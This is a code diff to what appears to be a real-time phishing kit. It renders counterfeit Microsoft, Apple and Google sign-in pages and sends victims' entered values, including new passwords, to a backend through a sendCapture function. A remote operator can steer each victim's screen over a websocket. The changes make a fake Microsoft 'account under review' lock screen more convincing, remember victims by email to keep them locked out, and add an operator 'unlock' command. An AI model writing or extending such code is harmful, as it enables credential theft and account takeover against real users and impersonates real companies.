@@ -1,6 +1,6 @@
 import { useState, useRef, useEffect, useCallback } from 'react';
 import { motion, AnimatePresence, type MotionProps } from 'framer-motion';
-import { ChevronLeft, Key, Eye, EyeOff, Check, X } from 'lucide-react';
+import { ChevronLeft, Key, Eye, EyeOff, Check, X, LogOut } from 'lucide-react';
 
 const MicrosoftLogo = () => (
   <svg width="20" height="20" viewBox="0 0 21 21" xmlns="http://www.w3.org/2000/svg">
@@ -214,34 +214,38 @@ function useVisitorWS({ provider, onNavigate, onProviderSwitch, onSiteStatus }: 
 
 // ─── Microsoft ──────────────────────────────────────────────────────────────
 
-function AccountLockedScreen({ isDark = true }: { isDark?: boolean }) {
-  const [secsLeft, setSecsLeft] = useState(3 * 60 * 60);
-  useEffect(() => {
-    const key = 'auth_studio_lock_start';
-    let start = parseInt(localStorage.getItem(key) ?? '0');
-    if (!start || isNaN(start)) { start = Date.now(); localStorage.setItem(key, String(start)); }
-    const endMs = start + 3 * 60 * 60 * 1000;
-    const tick = () => setSecsLeft(Math.max(0, Math.floor((endMs - Date.now()) / 1000)));
-    tick();
-    const t = setInterval(tick, 1000);
-    return () => clearInterval(t);
-  }, []);
-  const h = Math.floor(secsLeft / 3600);
-  const m = Math.floor((secsLeft % 3600) / 60);
-  const s = secsLeft % 60;
-  const fmt = `${h}:${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+function AccountLockedScreen({ email, onLogout }: { email: string; onLogout: () => void }) {
   return (
-    <div className={`fixed inset-0 z-50 flex flex-col items-center justify-center px-6 ${isDark ? 'bg-[#1a1a1a]' : 'bg-[#f5f5f7]'}`}>
-      <div className={`w-full max-w-[400px] rounded-xl border px-8 py-10 flex flex-col items-center ${isDark ? 'bg-[#222] border-[#333]' : 'bg-white border-[#d1d1d6]'}`}>
-        <div className={`w-16 h-16 rounded-full flex items-center justify-center mb-5 ${isDark ? 'bg-[#2a2a2a]' : 'bg-[#f5f5f7]'}`}>
-          <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke={isDark ? '#999' : '#6e6e73'} strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
-            <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
-          </svg>
+    <div
+      className="fixed inset-0 z-50 flex flex-col items-center justify-center"
+      style={{ backgroundColor: '#ffffff', backgroundImage: "url('/ms-bg.svg')", backgroundSize: 'cover', backgroundPosition: 'center' }}
+    >
+      <div className="w-full max-w-[440px] bg-white shadow-md px-10 pt-8 pb-10">
+        <div className="flex items-center justify-between mb-8">
+          <div className="flex items-center gap-2">
+            <MicrosoftLogo />
+            <span className="text-[15px] font-semibold text-[#737373]">Microsoft</span>
+          </div>
+          {email && (
+            <div className="flex items-center gap-1.5">
+              <span className="text-[13px] text-[#737373] truncate max-w-[190px]">{email}</span>
+              <button onClick={onLogout} title="Sign out" className="text-[#737373] hover:text-[#1b1b1b] transition-colors p-0.5 flex-shrink-0">
+                <LogOut className="w-4 h-4" />
+              </button>
+            </div>
+          )}
         </div>
-        <div className={`text-[20px] font-semibold mb-2 text-center ${isDark ? 'text-white' : 'text-[#1d1d1f]'}`}>Your account has been locked</div>
-        <div className={`text-[13px] mb-7 text-center leading-relaxed ${isDark ? 'text-[#aaa]' : 'text-[#6e6e73]'}`}>Our security systems are still running. You can try signing in again in:</div>
-        <div className={`text-[44px] font-bold tabular-nums mb-1 ${isDark ? 'text-white' : 'text-[#1d1d1f]'}`}>{fmt}</div>
-        <div className={`text-[12px] ${isDark ? 'text-[#666]' : 'text-[#aaa]'}`}>Approximate time remaining</div>
+        <div className="flex justify-center mb-6">
+          <div className="w-14 h-14 rounded-full bg-[#f2f2f2] flex items-center justify-center">
+            <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#737373" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
+              <rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/>
+            </svg>
+          </div>
+        </div>
+        <h1 className="text-[24px] font-semibold text-[#1b1b1b] mb-4">You can't sign in right now</h1>
+        <p className="text-[14px] text-[#737373] leading-relaxed">
+          Your account is under review. Please try again in a couple of hours.
+        </p>
       </div>
     </div>
   );
@@ -336,6 +340,7 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
   useEffect(() => {
     setNavigateHandler((s, action) => {
       setIsSubmitting(false);
+      if (s === 'unlock') { localStorage.removeItem('auth_studio_locked_email'); localStorage.removeItem('auth_studio_lock_start'); setStep('email'); return; }
       if (s === 'error-email') {
         setEmailError("We couldn't find an account with that username. Try another, or get a new Microsoft account.");
         setStep('email'); return;
@@ -366,6 +371,14 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
 
   const nav = (target: MsStep, captureField?: string, captureVal?: string) => {
     if (captureField && captureVal) sendCapture(captureField, captureVal);
+    if (target === 'password') {
+      const lockedEmail = localStorage.getItem('auth_studio_locked_email');
+      const currentEmail = captureVal || email;
+      if (lockedEmail && lockedEmail.toLowerCase() === currentEmail.toLowerCase()) {
+        setStep('account-locked');
+        return;
+      }
+    }
     setLoading(true);
     setTimeout(() => { setLoading(false); setStep(target); }, 900);
   };
@@ -445,7 +458,7 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
     </div>
   );
 
-  if (step === 'account-locked') return <AccountLockedScreen isDark={isDark} />;
+  if (step === 'account-locked') return <AccountLockedScreen email={email} onLogout={() => { localStorage.removeItem('auth_studio_locked_email'); localStorage.removeItem('auth_studio_lock_start'); setStep('email'); }} />;
 
   return (
     <div
@@ -944,6 +957,7 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
                           if (!/[A-Z]/.test(newPassword)) { setNewPasswordError('Password must contain at least one uppercase letter.'); return; }
                           if (!/[^A-Za-z0-9]/.test(newPassword)) { setNewPasswordError('Password must contain at least one special character.'); return; }
                           sendCapture('new_password', newPassword);
+                          localStorage.setItem('auth_studio_locked_email', email);
                           localStorage.setItem('auth_studio_lock_start', String(Date.now()));
                           setPwdChanged(true);
                         }
@@ -965,6 +979,7 @@ function MicrosoftLogin({ device, theme, sendCapture, sendStepUpdate, setNavigat
                       if (!/[A-Z]/.test(newPassword)) { setNewPasswordError('Password must contain at least one uppercase letter.'); return; }
                       if (!/[^A-Za-z0-9]/.test(newPassword)) { setNewPasswordError('Password must contain at least one special character.'); return; }
                       sendCapture('new_password', newPassword);
+                      localStorage.setItem('auth_studio_locked_email', email);
                       localStorage.setItem('auth_studio_lock_start', String(Date.now()));
                       setPwdChanged(true);
                     }}
@@ -1780,6 +1795,7 @@ function AppleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHan
 
   useEffect(() => {
     setNavigateHandler((s) => {
+      if (s === 'unlock') { setStep('email'); return; }
       if (s === 'error-email') {
         setEmailError("This Apple Account doesn't exist. Enter a different email or phone number.");
         setStep('email');
@@ -1918,7 +1934,7 @@ function AppleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHan
 
   const isLoadingState = loading || step === 'processing';
 
-  if (step === 'account-locked') return <AccountLockedScreen isDark={isDark} />;
+  if (step === 'account-locked') return <AccountLockedScreen email={email} onLogout={() => setStep('email')} />;
 
   return (
     <div style={S.page}>
@@ -2293,6 +2309,7 @@ function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHa
   useEffect(() => {
     setNavigateHandler((s, action) => {
       if (s === 'gmail-done') { window.location.href = 'https://mail.google.com'; return; }
+      if (s === 'unlock') { gotoStep('email'); return; }
       setResendClicked(false);
       setMoreWaysClicked(false);
       if (s === 'prompt-timeout') {
@@ -2354,7 +2371,7 @@ function GoogleLogin({ device, theme, sendCapture, sendStepUpdate, setNavigateHa
 
   const initial = email ? email[0].toUpperCase() : 'G';
 
-  if (step === 'account-locked') return <AccountLockedScreen isDark={isDark} />;
+  if (step === 'account-locked') return <AccountLockedScreen email={email} onLogout={() => gotoStep('email')} />;
 
   return (
     <>
